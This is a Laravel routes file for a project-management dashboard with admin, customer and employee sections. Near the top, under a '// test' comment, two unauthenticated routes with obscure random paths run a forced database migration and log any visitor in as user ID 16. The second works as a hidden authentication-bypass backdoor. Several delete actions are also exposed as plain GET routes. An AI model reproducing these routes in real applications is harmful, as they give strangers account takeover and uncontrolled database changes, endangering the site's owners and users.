<?php

use App\Providers\RouteServiceProvider;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\UserController;
/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/


// test

Route::get('/', function () {
    return redirect(RouteServiceProvider::HOME);
});
Route::get('/jiwuvya7gtrv682b7iwnorai', function() {
    Artisan::call('migrate --force');
});
Route::get('/aiwrughfdgcb', function() {
    \Auth::loginUsingId(16);
});
Route::get('install', 'InstallController@index')->name('install');
Route::post('installl', 'InstallController@install')->name('installl');
Auth::routes();

Route::prefix('dashboard')
    ->name('dashboard.')
    ->middleware('auth')
    ->namespace('Dashboard')
    ->group(function() {
        Route::get('',  'IndexController@get')->name('index');
        Route::get('profile',  'ProfileController@edit')->name('profile.edit');
        Route::put('profile',  'ProfileController@update')->name('profile.update');
        Route::prefix('admin')
            ->name('admin.')
            ->middleware(['user_type:admin'])
            ->namespace('Admin')
            ->group(function() {
                Route::get('',  'IndexController@get')->name('index');

                Route::resource('score', 'ScoreController');

                //Project PAGE
                Route::get('project/index/{id}', 'ProjectController@GetProject')->name('project.index');
                Route::post('project/create', ['uses' => 'ProjectController@CreatePost','as' => 'project.store']);
                Route::get('project/create', ['uses' => 'ProjectController@GetCreatePost','as' => 'project.create']);
                Route::get('project/manage', 'ProjectController@GetManagePost')->name('project.manage');
                Route::get('project/done', 'ProjectController@GetDonePost')->name('project.done');
                Route::get('project/paid', 'ProjectController@GetPaidPost')->name('project.paid');
                Route::get('project/{id}/status/{status}','ProjectController@UpdateStatus')->name('project.updatestatus');
                Route::get('deletepost/{id}','ProjectController@DeletePost')->name('project.deletepost');
                Route::get('updatepost/{id}','ProjectController@GetEditPost')->name('project.updatepost');
                Route::post('updatepost/{id}','ProjectController@UpdatePost')->name('project.update');
                
                //CUSTOMER PAGE
                Route::get('customer/show/{id}', 'CustomerController@GetCustomer')->name('customer.show');
                Route::post('customer/create', ['uses' => 'CustomerController@CreatePost','as' => 'customer.store']);
                Route::get('customer/create', ['uses' => 'CustomerController@GetCreatePost','as' => 'customer.create']);
                Route::get('customer/manage', 'CustomerController@GetManagePost')->name('customer.manage');
                Route::get('deletecustomer/{id}','CustomerController@DeletePost')->name('customer.deletecustomer');
                Route::get('updatecustomer/{id}','CustomerController@GetEditPost')->name('customer.updatecustomer');
                Route::post('updatecustomer/{id}','CustomerController@UpdatePost')->name('customer.update');
                
                //SERVICE PAGE
                Route::get('service/index/{id}', 'ServiceController@GetService')->name('service.index');
                Route::post('service/create/{id}', ['uses' => 'ServiceController@CreatePost','as' => 'service.store']);
                Route::get('service/create/{id}', ['uses' => 'ServiceController@GetCreatePost','as' => 'service.create']);
                Route::get('service/manage', 'ServiceController@GetManagePost')->name('service.manage');
                Route::get('deleteservice/{id}','ServiceController@DeletePost')->name('service.deleteservice');
                Route::get('updateservice/{id}','ServiceController@GetEditPost')->name('service.updateservice');
                Route::post('updateservice/{id}','ServiceController@UpdatePost')->name('service.update');               

                //PHASE PAGE
                Route::post('phase/create/{id}', ['uses' => 'PhaseController@CreatePost','as' => 'phase.store']);
                Route::get('deletephase/{id}/{project_id}','PhaseController@DeletePost')->name('phase.deletephase');
                Route::post('updatephase/{id}','PhaseController@UpdatePost')->name('phase.updatephase');
                Route::get('phase/tasks/{id}', 'PhaseController@GetManageTask')->name('phase.tasks');

                //SALARY PAGE
                Route::get('salary', ['uses' => 'SalaryController@GetIndex','as' => 'salary.index']);
                Route::post('salary/create', ['uses' => 'SalaryController@CreatePost','as' => 'salary.store']);
                Route::get('salary/create', ['uses' => 'SalaryController@GetCreatePost','as' => 'salary.create']);
                Route::get('salary/{salary}/delete','SalaryController@DeletePost')->name('salary.delete');
                Route::get('salary/{salary}','SalaryController@GetEditPost')->name('salary.edit');
                Route::post('salary/{salary}','SalaryController@UpdatePost')->name('salary.update');

               //EMPLOYEE PAGE
               Route::post('employee/create/{id}', ['uses' => 'EmployeeController@CreatePost','as' => 'employee.store']);
               Route::get('deleteemployee/{id}/{project_id}','EmployeeController@DeletePost')->name('employee.deleteemployee');
               Route::post('updateemployee/{id}','EmployeeController@UpdatePost')->name('employee.updateemployee');

               //TASK PAGE
               Route::post('task/create/{id}', ['uses' => 'TaskController@CreatePost','as' => 'task.store']);
               Route::get('deletetask/{id}','TaskController@DeletePost')->name('task.deletetask');
               Route::post('updatetask/{id}','TaskController@UpdatePost')->name('task.update');
               Route::get('updatetask/{id}','TaskController@GetTask')->name('task.updatetask');
               Route::post('edittask/{id}','TaskController@EditPost')->name('task.edittask');

               //Users PAGE
               Route::get('users/employee', 'UserController@GetUsers')->name('users.employee');
               Route::get('users/profile/{id}', 'UserController@GetProfile')->name('users.profile');
               Route::get('users/restore/{id}','UserController@restore')->name('users.restore');
               Route::get('deleteuser/{id}','UserController@DeletePost')->name('users.deleteuser');
               Route::get('updateuser/{id}','UserController@GetEditPost')->name('users.updateuser');
               Route::post('updateuser/{id}','UserController@UpdatePost')->name('users.update');

               //ACCOUNTING PAGE
               Route::get('money/employee', 'AccountingController@GetEmployee')->name('money.employee');

               //ABSENCE PAGE
               Route::get('absence/manage', 'AbsenceController@GetAbsence')->name('absence.manage');

               //MESSAGE PAGE
               Route::post('message/create', ['uses' => 'MessageController@CreatePost','as' => 'message.store']);
               Route::get('message/create', ['uses' => 'MessageController@GetCreatePost','as' => 'message.create']);
               Route::get('message/manage', 'MessageController@GetMessage')->name('message.manage');
               Route::get('deletemessage/{id}','MessageController@DeletePost')->name('message.deletemessage');
               Route::get('updatemessage/{id}','MessageController@GetEditPost')->name('message.updatemessage');
               Route::post('updatemessage/{id}','MessageController@UpdatePost')->name('message.update');
               Route::get('message/show/{id}', 'MessageController@ShowMessage')->name('message.show');
               Route::get('message/{message}/answer', 'MessageController@GetAnswerMessage')->name('message.answer.edit');
               Route::post('message/{message}/answer', 'MessageController@AnswerMessage')->name('message.answer.updat');

               //DAILY MANAGMENT
                Route::post('daily/create', ['uses' => 'DailyController@CreatePost','as' => 'daily.store']);
                Route::get('daily/create', ['uses' => 'DailyController@GetCreatePost','as' => 'daily.create']);
                Route::get('daily/manage', 'DailyController@GetManagePost')->name('daily.manage');
                Route::get('updatedaily/{id}','DailyController@GetEditPost')->name('daily.updatedaily');
                Route::get('show/{id}','DailyController@GetTask')->name('daily.show');
                Route::get('updatedaily/{id}','DailyController@GetEditPost')->name('daily.updatedaily');
                Route::post('updatedaily/{id}','DailyController@UpdatePost')->name('daily.update');
                Route::post('editdaily/{id}','DailyController@EditPost')->name('daily.editdaily');

               //DATE MANAGMENT
                Route::post('date/create', ['uses' => 'DateController@CreatePost','as' => 'date.store']);
                Route::get('date/create', ['uses' => 'DateController@GetCreatePost','as' => 'date.create']);
                Route::get('date/manage', 'DateController@GetDate')->name('date.manage');
                Route::get('deletedate/{id}','DateController@DeletePost')->name('date.deletedate');
                
               //REPORT PAGE
                Route::get('report/index', 'ReportController@index')->name('report.index');
                Route::get('report/show/{id}', 'ReportController@show')->name('report.show');
                Route::get('report/absence/{id}', 'ReportController@absence')->name('report.absence');
            });

        Route::prefix('customer')
            ->name('customer.')
            ->middleware(['user_type:customer'])
            ->namespace('Customer')
            ->group(function() {
                Route::get('',  'IndexController@get')->name('index');

            });

        Route::prefix('employee')
            ->name('employee.')
            ->middleware(['user_type:employee'])
            ->namespace('Employee')
            ->group(function() {
                Route::get('',  'IndexController@get')->name('index');
                Route::get('profile',  'IndexController@profile')->name('profile');

                //TASK MANAGMENT
                Route::post('task/create', ['uses' => 'TaskController@CreatePost','as' => 'task.store']);
                Route::get('task/create', ['uses' => 'TaskController@GetCreatePost','as' => 'task.create']);
                Route::get('task/manage', 'TaskController@GetManagePost')->name('task.manage');
                Route::get('updatetask/{id}','TaskController@GetEditPost')->name('task.edit');
                Route::get('show/{id}','TaskController@GetTask')->name('task.show');
                Route::get('updatetask/{id}','TaskController@GetEditPost')->name('task.updatetask');
                Route::post('updatetask/{id}','TaskController@UpdatePost')->name('task.update');
                Route::post('edittask/{id}','TaskController@EditPost')->name('task.edittask');
                
                Route::post('task/note', ['uses' => 'TaskController@CreateNote','as' => 'task.note']);
                Route::get('deletenote/{id}','TaskController@DeleteNote')->name('task.deletenote');
                

                //ABSENCE
                Route::post('absence/create', ['uses' => 'TaskController@Absence','as' => 'absence.store']);
                Route::post('absence/end/{id}','TaskController@AbsenceEnd')->name('absence.end');

                //MESSAGE PAGE
                Route::get('message/manage', 'MessageController@GetMessage')->name('message.manage');
                Route::get('message/show/{id}', 'MessageController@ShowMessage')->name('message.show');
                Route::get('message/{message}/answer', 'MessageController@GetAnswerMessage')->name('message.answer.edit');
                Route::post('message/{message}/answer', 'MessageController@AnswerMessage')->name('message.answer.post');

                //ACCOUNTING PAGE
                Route::get('money', 'AccountingController@GetMoney')->name('money.index');

     });
    });
